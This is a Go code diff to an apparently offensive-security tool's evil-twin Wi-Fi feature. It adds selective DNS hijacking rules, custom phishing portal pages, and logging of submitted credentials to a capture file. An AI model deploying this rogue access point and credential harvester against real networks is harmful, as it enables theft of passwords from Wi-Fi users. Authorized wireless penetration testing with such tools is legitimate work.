@@ -25,8 +25,14 @@ type EvilConfig struct {
 	Channel     int    `json:"channel"`
 	NAT         bool   `json:"nat"`
 	Portal      bool   `json:"portal"`
+	PortalMode  string `json:"portal_mode,omitempty"` // login|custom
+	PortalFile  string `json:"portal_file,omitempty"` // custom HTML page
 	PMKID       bool   `json:"pmkid"`
 	DeauthBSSID string `json:"deauth_bssid,omitempty"`
+	// DNSRules redirect chosen hostnames to local addresses (dnsmasq address=).
+	DNSRules []DNSRule `json:"dns_rules,omitempty"`
+	// PortalLog is where credential submissions are appended (NDJSON).
+	PortalLog string `json:"portal_log,omitempty"`
 
 	WorkDir    string `json:"work_dir,omitempty"`
 	CaptureDir string `json:"capture_dir,omitempty"`
@@ -61,9 +67,10 @@ func HostapdConfig(cfg EvilConfig) string {
 	return b.String()
 }
 
-// DnsmasqConfig renders the DHCP + catch-all DNS configuration: every name
-// resolves to the twin so any URL lands on the captive portal.
-func DnsmasqConfig(iface, gateway string) string {
+// DnsmasqConfig renders the DHCP + DNS configuration: every name resolves to
+// the twin (so any URL lands on the captive portal) unless custom rules send
+// specific hostnames to another local server.
+func DnsmasqConfig(iface, gateway string, rules ...DNSRule) string {
 	if strings.TrimSpace(gateway) == "" {
 		gateway = EvilGateway
 	}
@@ -74,7 +81,10 @@ func DnsmasqConfig(iface, gateway string) string {
 	fmt.Fprintf(&b, "dhcp-range=%s\n", EvilSubnet)
 	fmt.Fprintf(&b, "dhcp-option=3,%s\n", gateway)
 	fmt.Fprintf(&b, "dhcp-option=6,%s\n", gateway)
-	fmt.Fprintf(&b, "address=/#/%s\n", gateway)
+	for _, line := range DNSSection(gateway, rules) {
+		b.WriteString(line)
+		b.WriteString("\n")
+	}
 	b.WriteString("no-resolv\n")
 	b.WriteString("no-hosts\n")
 	b.WriteString("log-dhcp\n")
@@ -225,8 +235,13 @@ func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error
 	if err := os.WriteFile(hostapdConf, []byte(HostapdConfig(cfg)), 0o600); err != nil {
 		return err
 	}
-	if err := os.WriteFile(dnsmasqConf, []byte(DnsmasqConfig(cfg.Iface, EvilGateway)), 0o600); err != nil {
+	if err := os.WriteFile(dnsmasqConf, []byte(DnsmasqConfig(cfg.Iface, EvilGateway, cfg.DNSRules...)), 0o600); err != nil {
 		return err
+	}
+	if len(cfg.DNSRules) > 0 {
+		for _, rule := range cfg.DNSRules {
+			emit.line("DNS %s -> %s", rule.Host, rule.IP)
+		}
 	}
 
 	r := defaultPentestRunner()
@@ -357,15 +372,50 @@ func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error
 	emit.line("Twin AP %q up on %s (channel %d)", cfg.SSID, cfg.Iface, cfg.Channel)
 
 	if cfg.Portal {
-		srv := &http.Server{Addr: EvilGateway + ":80", Handler: portalHandler(), ReadHeaderTimeout: 5 * time.Second}
+		mode := ParsePortalMode(cfg.PortalMode)
+		if mode == PortalOff {
+			mode = PortalLogin
+		}
+		portalLog := strings.TrimSpace(cfg.PortalLog)
+		if portalLog == "" {
+			portalLog = filepath.Join(captureDirOf(cfg), fmt.Sprintf("portal-%s.ndjson", time.Now().Format("20060102_150405")))
+		}
+		// Create the capture up front (as root) and hand it to the invoking user
+		// so the log is readable from Files / a normal shell afterwards.
+		if f, cerr := os.OpenFile(portalLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); cerr == nil {
+			_ = f.Close()
+			if cfg.UID > 0 || cfg.GID > 0 {
+				_ = os.Chown(portalLog, cfg.UID, cfg.GID)
+			}
+		}
+		handler := NewPortalHandler(PortalConfig{
+			Mode:    mode,
+			File:    cfg.PortalFile,
+			LogPath: portalLog,
+			OnEvent: func(line string) { emit.line("%s", line) },
+		})
+		srv := &http.Server{Addr: EvilGateway + ":80", Handler: handler, ReadHeaderTimeout: 5 * time.Second}
 		go func() { _ = srv.ListenAndServe() }()
 		cleanups = append(cleanups, func() { _ = srv.Close() })
-		emit.line("Captive portal on http://%s", EvilGateway)
+		page := "built-in login"
+		if mode == PortalCustom && strings.TrimSpace(cfg.PortalFile) != "" {
+			page = filepath.Base(cfg.PortalFile)
+		}
+		emit.line("Captive portal (%s) on http://%s", page, EvilGateway)
+		emit.line("Saving submissions to %s", portalLog)
 	}
 
 	<-ctx.Done()
 	emit.line("Stopping twin")
 	return ctx.Err()
+}
+
+// captureDirOf resolves where portal captures are written.
+func captureDirOf(cfg EvilConfig) string {
+	if dir := strings.TrimSpace(cfg.CaptureDir); dir != "" {
+		return dir
+	}
+	return filepath.Join(os.TempDir(), "czhax-captures")
 }
 
 // lastToolReason picks the most useful line out of a tool's captured output for
